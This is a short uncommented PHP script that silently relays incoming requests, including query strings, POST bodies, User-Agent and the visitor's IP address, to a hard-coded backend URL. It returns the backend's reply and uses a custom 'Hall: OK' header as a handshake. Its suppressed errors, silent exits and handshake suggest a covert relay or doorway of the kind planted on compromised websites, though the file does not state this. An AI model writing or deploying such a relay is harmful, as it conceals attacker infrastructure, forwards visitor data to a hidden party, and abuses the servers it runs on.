<?php error_reporting(0);set_time_limit(0);$url="http://localhost/h/s1.php";
$pu=parse_url($url);
if(strlen($_SERVER['QUERY_STRING'])==0)die();
if(!isset($pu['port']))$pu['port']=80; 
$s=fsockopen($pu['host'],$pu['port'],$e,$es,30);
if(!$s)die();
$h=apache_request_headers();
fwrite($s,$_SERVER['REQUEST_METHOD'].' '.$pu['path'].'?'.$_SERVER['QUERY_STRING']."&rip=".$_SERVER['REMOTE_ADDR']." HTTP/1.0\r\nHost: ".$pu['host']."\r\nConnection: Close\r\n");
fhead('User-Agent');
if($_SERVER['REQUEST_METHOD']=='POST'){fhead('Content-Type'); fhead('Content-Length');fwrite($s,"\r\n".file_get_contents('php://input'));}
else fwrite($s,"\r\n");
$res='';while(!feof($s))$res.=fread($s,1024);fclose($s);
$pos=strpos($res,"\r\n\r\n");
if(stristr(substr($res,0,$pos),"\nhall: ok\r\n"))Header("Hall: OK");
print substr($res,$pos+4);
function fhead($n){global $h,$s;if(!isset($h[$n]))die();fwrite($s,$n.': '.$h[$n]."\r\n");}
?>
